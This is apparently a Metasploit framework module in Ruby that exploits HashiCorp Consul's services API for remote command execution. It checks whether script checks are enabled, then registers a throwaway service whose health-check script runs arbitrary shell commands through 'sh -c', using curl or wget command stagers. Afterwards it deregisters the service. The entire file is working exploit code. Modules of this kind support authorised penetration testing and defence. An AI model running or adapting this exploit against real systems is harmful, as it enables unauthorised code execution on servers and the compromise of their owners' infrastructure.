# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Hashicorp Consul Remote Command Execution via Services API",
      &#039;Description&#039;    => %q{
        This module exploits Hashicorp Consul&#039;s services API to gain remote command
        execution on Consul nodes.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Bharadwaj Machiraju <bharadwaj.machiraju[at]gmail.com>&#039;, # Discovery and PoC
          &#039;Francis Alexander <helofrancis[at]gmail.com >&#039;, # Discovery and PoC
          &#039;Quentin Kaiser <kaiserquentin[at]gmail.com>&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;https://www.consul.io/api/agent/service.html&#039; ],
          [ &#039;URL&#039;, &#039;https://github.com/torque59/Garfield&#039; ]
        ],
      &#039;Platform&#039;        => &#039;linux&#039;,
      &#039;Targets&#039;         => [ [ &#039;Linux&#039;, {} ] ],
      &#039;Payload&#039;         => {},
      &#039;CmdStagerFlavor&#039; => [ &#039;bourne&#039;, &#039;echo&#039;, &#039;printf&#039;, &#039;curl&#039;, &#039;wget&#039;],
      &#039;Privileged&#039;     => false,
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Aug 11 2018&#039;))
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path&#039;, &#039;/&#039;]),
        OptBool.new(&#039;SSL&#039;, [false, &#039;Negotiate SSL/TLS for outgoing connections&#039;, false]),
        OptString.new(&#039;ACL_TOKEN&#039;, [false, &#039;Consul Agent ACL token&#039;, &#039;&#039;]),
        Opt::RPORT(8500)
      ])
  end

  def check
    res = send_request_cgi({
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;uri&#039;     => normalize_uri(target_uri.path, &#039;/v1/agent/self&#039;),
      &#039;headers&#039; => {
        &#039;X-Consul-Token&#039; => datastore[&#039;ACL_TOKEN&#039;]
      }
    })

    unless res
      vprint_error &#039;Connection failed&#039;
      return CheckCode::Unknown
    end

    unless res.code == 200
      vprint_error &#039;Unexpected reply&#039;
      return CheckCode::Safe
    end

    agent_info = JSON.parse(res.body)

    if agent_info["Config"]["EnableScriptChecks"] == true || agent_info["DebugConfig"]["EnableScriptChecks"] == true || agent_info["DebugConfig"]["EnableRemoteScriptChecks"] == true
      return CheckCode::Vulnerable
    end

    CheckCode::Safe
  rescue JSON::ParserError
    vprint_error &#039;Failed to parse JSON output.&#039;
    return CheckCode::Unknown
  end

  def execute_command(cmd, opts = {})
    uri = target_uri.path
    service_name = Rex::Text.rand_text_alpha(5..10)
    print_status("Creating service &#039;#{service_name}&#039;")

    # NOTE: Timeout defines how much time the check script will run until
    # getting killed. Arbitrarily set to one day for now.
    res = send_request_cgi({
      &#039;method&#039; => &#039;PUT&#039;,
      &#039;uri&#039; => normalize_uri(uri, &#039;v1/agent/service/register&#039;),
      &#039;headers&#039; => {
        &#039;X-Consul-Token&#039; => datastore[&#039;ACL_TOKEN&#039;]
      },
      &#039;ctype&#039; => &#039;application/json&#039;,
      &#039;data&#039; => {
        :ID => "#{service_name}",
        :Name => "#{service_name}",
        :Address => "127.0.0.1",
        :Port => 80,
        :check => {
          :script => "#{cmd}",
          :Args => ["sh", "-c", "#{cmd}"],
          :interval => "10s",
          :Timeout => "86400s"
        }
      }.to_json
    })
    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, &#039;An error occured when contacting the Consul API.&#039;)
    end
    print_status("Service &#039;#{service_name}&#039; successfully created.")
    print_status("Waiting for service &#039;#{service_name}&#039; script to trigger")
    sleep(12)
    print_status("Removing service &#039;#{service_name}&#039;")
    res = send_request_cgi({
      &#039;method&#039; => &#039;PUT&#039;,
      &#039;uri&#039; => normalize_uri(
        uri,
        "v1/agent/service/deregister/#{service_name}"
      ),
      &#039;headers&#039; => {
        &#039;X-Consul-Token&#039; => datastore[&#039;ACL_TOKEN&#039;]
      }
    })
    if res && res.code != 200
      fail_with(Failure::UnexpectedReply,
        &#039;An error occured when contacting the Consul API.&#039;
      )
    end
  end

  def exploit
    execute_cmdstager()
  end
end

